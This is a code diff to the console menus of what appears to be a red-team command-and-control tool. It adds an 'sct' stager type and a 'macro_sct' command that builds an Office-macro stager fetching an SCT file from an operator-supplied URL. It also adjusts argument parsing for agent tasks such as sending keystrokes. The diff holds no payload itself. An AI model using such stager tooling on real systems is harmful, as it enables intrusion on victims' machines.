@@ -177,22 +177,22 @@ class MainMenu(cmd.Cmd):
 
 	#------------------------------------------------------------------------------------
 	def do_genStager(self, args):
-		"""genStager <oneliner|batch|macro|msbuild|javascript|ducky> <stage name>\nGenerates a stager of the selected type using a specific stage name"""
+		"""genStager <oneliner|batch|macro|msbuild|javascript|ducky|sct> <stage name>\nGenerates a stager of the selected type using a specific published stage name"""
 
 		# Checking args
 		if not args:
-			print helpers.color("[!] Missing arguments. Command format: genStager <oneliner|batch|macro|msbuild|javascript|ducky> <stage name>")
+			print helpers.color("[!] Missing arguments. Command format: genStager <oneliner|batch|macro|msbuild|javascript|ducky|sct> <stage name>")
 			return
 
 		arguments = args.split()
 		if len(arguments) < 2:
-			print helpers.color("[!] Missing arguments. Command format: genStager <oneliner|batch|macro|msbuild|javascript|ducky> <stage name>")
+			print helpers.color("[!] Missing arguments. Command format: genStager <oneliner|batch|macro|msbuild|javascript|ducky|sct> <stage name>")
 			return
 
 		stagerType = arguments[0]
 		stageName = arguments[1]
 
-		if stagerType not in ['oneliner', 'batch', 'macro', 'msbuild', 'javascript', 'ducky']:
+		if stagerType not in ['oneliner', 'batch', 'macro', 'msbuild', 'javascript', 'ducky', 'sct']:
 			print helpers.color("[!] Invalid stager type")
 			return
 
@@ -206,7 +206,7 @@ class MainMenu(cmd.Cmd):
 	def complete_genStager(self, text, line, startidx, endidx):
 		result = []
 		if startidx < 15:
-			for stagerType in ['oneliner', 'batch', 'macro', 'msbuild', 'javascript', 'ducky']:
+			for stagerType in ['oneliner', 'batch', 'macro', 'msbuild', 'javascript', 'ducky', 'sct']:
 				if stagerType.startswith(text):
 					result.append(stagerType)	
 		else:
@@ -216,6 +216,32 @@ class MainMenu(cmd.Cmd):
 					result.append(stageName)
 		return result
 
+	#------------------------------------------------------------------------------------
+	def do_genStager2(self, args):
+		"""genStager2 <macro_sct>\nGenerates a stager itself based on a previously created stager using genStager"""
+
+		# Checking args
+		if not args:
+			print helpers.color("[!] Missing arguments. Command format: genStager2 <macro_sct>")
+			return
+
+		arguments = args.split()
+		stagerType = arguments[0]
+		stagerArguments = ""
+
+		if stagerType not in ['macro_sct']:
+			print helpers.color("[!] Invalid stager type")
+			return
+
+		if stagerType in ['macro_sct']:
+			stagerArguments = raw_input("[{}] Please provide a URL serving the SCT stager file the macro will use: ".format(stagerType))
+
+		self.mainHandler.genStager2(stagerType, stagerArguments)
+
+	#------------------------------------------------------------------------------------
+	def complete_genStager2(self, text, line, startidx, endidx):
+		return [s for s in ['macro_sct'] if s.startswith(text)]
+		
 	#------------------------------------------------------------------------------------
 	def do_taskList(self, args):
 		"""Show the list of all pending tasks assigned to any agent"""
@@ -346,7 +372,7 @@ class AgentMenu(cmd.Cmd):
 			return
 		
 		try:
-			arguments = helpers.retrieveArgs(args,2)
+			arguments = helpers.retrieveQuotedArgs(args,2)
 		except ValueError as e:
 			print helpers.color("[!] Wrong arguments format: {}".format(e))
 			return
@@ -429,7 +455,7 @@ class AgentMenu(cmd.Cmd):
 			return
 		
 		try:
-			arguments = helpers.retrieveArgs(args,2)
+			arguments = helpers.retrieveQuotedArgs(args,2)
 		except ValueError as e:
 			print helpers.color("[!] Wrong arguments format: {}".format(e))
 			return
@@ -464,7 +490,7 @@ class AgentMenu(cmd.Cmd):
 			return
 		
 		try:
-			arguments = helpers.retrieveArgs(args,2)
+			arguments = helpers.retrieveQuotedArgs(args,2)
 		except ValueError as e:
 			print helpers.color("[!] Wrong arguments format: {}".format(e))
 			return
@@ -508,7 +534,7 @@ class AgentMenu(cmd.Cmd):
 			return
 		
 		try:
-			arguments = helpers.retrieveArgs(args,1)
+			arguments = helpers.retrieveQuotedArgs(args,1)
 		except ValueError as e:
 			print helpers.color("[!] Wrong arguments format: {}".format(e))
 			return
@@ -589,12 +615,8 @@ class AgentMenu(cmd.Cmd):
 			print helpers.color("[!] Missing arguments. Command format: sendKeystrokes <process_name> <keys>")
 			return
 		
-		try:
-			arguments = helpers.retrieveArgs(args,2)
-		except ValueError as e:
-			print helpers.color("[!] Wrong arguments format: {}".format(e))
-			return
-
+		arguments = args.split(' ',1)
+		
 		if len(arguments) < 2:
 			print helpers.color("[!] Missing arguments. Command format: sendKeystrokes <process_name> <keys>")
 			return
